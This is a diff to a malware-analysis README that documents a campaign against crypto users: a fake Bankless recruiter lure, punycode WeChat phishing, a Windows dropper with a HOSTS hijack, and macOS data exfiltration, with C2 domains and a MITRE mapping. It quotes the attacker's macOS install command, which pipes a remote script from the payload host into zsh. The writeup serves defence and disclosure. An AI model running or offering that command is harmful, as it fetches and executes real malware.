@@ -59,7 +59,50 @@ Detection rules are provided in `detection/`:
 
 ## Technical Analysis
 
-The full technical report is published separately. This repository contains IOCs and detection rules for immediate community use.
+### Attack Chain Summary
+
+**Stage 0 — Social Engineering:** Telegram DM from fake "Bankless" recruiter with a fake job opportunity. Lure: "Oscar Hansen | Bankless invites you to join the call!"
+
+**Stage 1 — Punycode Cloaking:** `wechat\u4f1a\u9762.com` (Chinese for "meeting") encoded as `xn--wechat-u88im840c.com` — visually indistinguishable from a legitimate WeChat domain.
+
+**Stage 2 — OS-Aware Delivery:**
+- macOS: `curl -kfsSL https://wechat.appstore.ms/macos/installation | zsh`
+- Windows: `WeChat_Setup.exe` (101MB NSIS+Electron dropper)
+
+**Stage 3 — Windows Execution:**
+- Fake "Mozilla Firefox is updating" decoy window appears
+- Malwarebytes real-time protection provides **zero detection** during execution
+- Malwarebytes processes are **neutralized** (active anti-AV process interference)
+- HOSTS file replaced with 1728 bytes of redirects (40-50 entries)
+- Confirmed anti-analysis entry: `127.0.0.1 www.virustotal.com`
+
+**Stage 4 — macOS Payload (Decoded):** zsh daemon detaches -> C2 AppleScript collects system data -> chunked HTTP PUT upload (10MB chunks) to `/gate` -> self-deleting zip cleanup.
+
+### Binary Analysis
+
+- **File:** `WeChat_Setup.exe` (101MB, 106,534,224 bytes)
+- **Type:** PE32 executable, NSIS 5.9.1 installer
+- **Payload:** Electron app (React 18 + Tailwind + Electron-toolkit v5.9.12.57810)
+- **Verification:** 1,940 ASAR archive files extracted and analyzed — **no malicious JS calls** (no exec/spawn/writeFile/child_process)
+- **Conclusion:** The Electron app is a **social engineering decoy** that displays a fake WeChat UI while the actual malicious payload (Hijack.Host / HOSTS replacement) runs independently via the NSIS installer logic
+
+### C2 Infrastructure
+
+- **C2 Domain:** `charlestonwaterheater.com` (Cloudflare-fronted, Unstoppable Domains registrar)
+- **Phishing Domain:** `xn--wechat-u88im840c.com` (Tucows registrar, Cloudflare-fronted)
+- **Payload Host:** `wechat.appstore.ms`
+- **Cloudflare IPs:** `104.21.85.232`, `172.67.211.228`
+
+### Malwarebytes Baseline Comparison
+
+Installed as a real-time detection baseline in the analysis environment:
+- **Execution:** 0 detection, 0 alerts, 0 prevention
+- **Post-deployment scan:** Found only Hijack.Host (HOSTS file replacement) — 1 artifact out of a multi-stage chain
+- **Anti-AV observation:** Two-phase neutralization — active process interference during execution + persistent DNS blocking via HOSTS hijack after deployment
+
+### MITRE ATT&CK Mapping (16 Techniques)
+
+Mapped across Reconnaissance, Phishing, Masquerading, System Configuration, Hosts File Modification, Impair Defenses, Abuse Elevation Control, Create/Modify System Process, Obfuscated Files, Input Capture, and Exfiltration Over C2. Full technique IDs and platform breakdowns available in the IOC data.
 
 ---
 
